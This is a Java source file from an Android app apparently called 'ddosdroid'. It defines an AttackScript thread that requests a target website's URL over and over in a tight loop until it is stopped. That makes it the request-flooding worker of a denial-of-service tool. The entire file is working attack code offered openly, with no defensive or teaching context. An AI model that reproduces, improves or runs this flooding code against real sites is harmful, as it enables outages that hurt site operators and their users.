package gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.connectivity;

import android.util.Log;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.concurrent.atomic.AtomicBoolean;

public class AttackScript extends Thread {
    private static final String TAG = "AttackScript";

    private URL url;
    private AtomicBoolean stopped = new AtomicBoolean(false);

    public AttackScript(String website) {
        initUrl(website);
    }

    private void initUrl(String website) {
        try {
            url = new URL(website);
        } catch (MalformedURLException e) {
            Log.e(TAG, "Wrong url?", e);
        }
    }

    @Override
    public void run() {
        //  Why not using interruption? Check own question "Can't interrupt tasks of
        //  ExecutorService" on StackOverflow.
        while (!stopped.get()) {
            readUrl();
        }
    }

    private void readUrl() {
        InputStream in = null;
        try {
            //  In case of a non-existing website InputStream is null.
            in = url.openStream();
        } catch (FileNotFoundException e) {
            Log.w(TAG, "Website " + url + " not found.");
        } catch (IOException e) {
            Log.e(TAG, "openStream() error.", e);
        } finally {
            closeInputStream(in);
        }
    }

    private void closeInputStream(InputStream in) {
        try {
            if (in != null) {
                in.close();
            } else {
                Log.w(TAG, "inputStream is null. Is " + url + " a valid website?");
            }
        } catch (IOException e) {
            Log.e(TAG, "Error while closing the input stream.", e);
        }
    }

    public void stopAttack() {
        stopped.set(true);
    }
}
